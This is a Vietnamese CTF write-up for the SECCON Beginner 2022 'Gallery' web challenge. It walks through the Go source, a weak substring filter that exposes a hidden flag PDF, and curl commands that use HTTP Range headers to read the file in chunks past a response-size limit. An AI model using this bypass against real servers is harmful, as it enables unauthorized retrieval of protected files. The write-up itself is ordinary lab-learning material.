## SECCON BEGINNER CTF 2022

### Gallery

Chỉnh sửa cấu hình để build:
```s
version: '3'
services:
  api:
    container_name: "api"
    build: ./backend
    volumes:
      - ./backend:/go/src/backend
    restart: always
  
  nginx:
    container_name: "nginx"
    build: ./nginx
    ports:
      - 8080:80
    depends_on:
      - api
    restart: always
```
```s
server {
    listen 80;
    server_name  localhost;

    merge_slashes off;

    location / {
        proxy_pass http://api:8080;
    }
}
```

Nó sử dụng mux để điều khiển các routers.
```go
package main

import (
	"bytes"
	"net/http"

	"github.com/gorilla/mux"
)

const (
	PORT = "8080"
	DIR  = "static"
)

type MyResponseWriter struct {
	http.ResponseWriter
	lengthLimit int
}

func (w *MyResponseWriter) Header() http.Header {
	return w.ResponseWriter.Header().Clone()
}

func (w *MyResponseWriter) Write(data []byte) (int, error) {
	filledVal := []byte("?")

	length := len(data)
	if length > w.lengthLimit {
		w.ResponseWriter.Write(bytes.Repeat(filledVal, length))
		return length, nil
	}

	w.ResponseWriter.Write(data[:length])
	return length, nil
}

func middleware() func(http.Handler) http.Handler {
	return func(h http.Handler) http.Handler {
		return http.HandlerFunc(func(rw http.ResponseWriter, r *http.Request) {
			h.ServeHTTP(&MyResponseWriter{
				ResponseWriter: rw,
				lengthLimit:    10240, // SUPER SECURE THRESHOLD
			}, r)
		})
	}
}

func main() {
	r := mux.NewRouter()
	r.PathPrefix("/images/").Methods("GET").Handler(http.StripPrefix("/images/", http.FileServer(http.Dir(DIR))))

	r.HandleFunc("/", IndexHandler)

	http.ListenAndServe(":"+PORT, middleware()(r))
}
```

Chứa middleware dùng để limit giới hạn trả về cho người dùng.

```go
package main

import (
	"html/template"
	"log"
	"net/http"
	"os"
	"strings"
)

type Embed struct {
	ImageList []string
}

func IndexHandler(w http.ResponseWriter, r *http.Request) {
	t, err := template.New("index.html").ParseFiles("./static/index.html")
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		log.Println(err)
		return
	}

	// replace suspicious chracters
	fileExtension := strings.ReplaceAll(r.URL.Query().Get("file_extension"), ".", "")
	fileExtension = strings.ReplaceAll(fileExtension, "flag", "")
	if fileExtension == "" {
		fileExtension = "jpeg"
	}
	log.Println(fileExtension)

	data := Embed{}
	data.ImageList, err = getImageList(fileExtension)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		log.Println(err)
		return
	}

	if err := t.Execute(w, data); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		log.Println(err)
		return
	}
}

func getImageList(fileExtension string) ([]string, error) {
	files, err := os.ReadDir("static")
	if err != nil {
		return nil, err
	}

	res := make([]string, 0, len(files))
	for _, file := range files {
		if !strings.Contains(file.Name(), fileExtension) {
			continue
		}
		res = append(res, file.Name())
	}

	return res, nil
}
```

Trong handlers.go:
- Biến fileExtension filter dấu '.', đó gọi đến getImageList.
- Logs ra là thấy ta nhập vào gì thì `log.Println(fileExtension)` sẽ in ra như vậy, ngoại trừ những dấu '.'
```s
rayinaw@rune:/mnt/hgfs/vmware/seccon-beginners-2022/gallery$ docker logs 8f9f009f5512
2023/04/21 19:42:36 jpeg
2023/04/21 19:43:03 gif
2023/04/21 19:43:11 jpeg
2023/04/21 19:43:12 png
2023/04/21 19:43:24 aaa
2023/04/21 19:43:28 gif
2023/04/21 19:45:01 jpeg
2023/04/21 19:45:06 jpeg
2023/04/21 19:45:15 jpeg
2023/04/21 20:05:09 gif
2023/04/21 20:05:15 /////////////
2023/04/21 20:05:21 ////
2023/04/21 20:05:23 /
2023/04/21 20:05:26 //
2023/04/21 20:05:46 /
2023/04/21 20:05:51 jpeg
2023/04/21 20:06:25 //////////////////
2023/04/21 20:08:43 skdfjkdsjlfkjds
```
-Trong getImageList, đoạn so sánh không chặt chẽ: `!strings.Contains(file.Name(), fileExtension)` nên nếu chỉ cần trùng một ký tự là file sẽ show ra.
```s
http://localhost:8080/?file_extension=a
flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf
```
Bây giờ để lấy ra file này, ta cần đọc từ từ từng 10240 bytes.

```s
curl -X GET -H 'Range: bytes=0-10239' http://localhost:8080/images/flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf --output - > 0.pdf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10240    0 10240    0     0  1111k      0 --:--:-- --:--:-- --:--:-- 1111k
```

```s
curl -X GET -H 'Range: bytes=10240-20479' http://localhost/images/flag_7a96139e-71a2-4381-bf31-adf37df94c04.pdf --output - > 1.pdf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  5845    0  5845    0     0   815k      0 --:--:-- --:--:-- --:--:--  815k
```
5845<10240, vậy là đã đọc hết bytes.
cat 0.pdf 1.pdf > flag.pdf
Mở file flag.pdf để lấy flag.


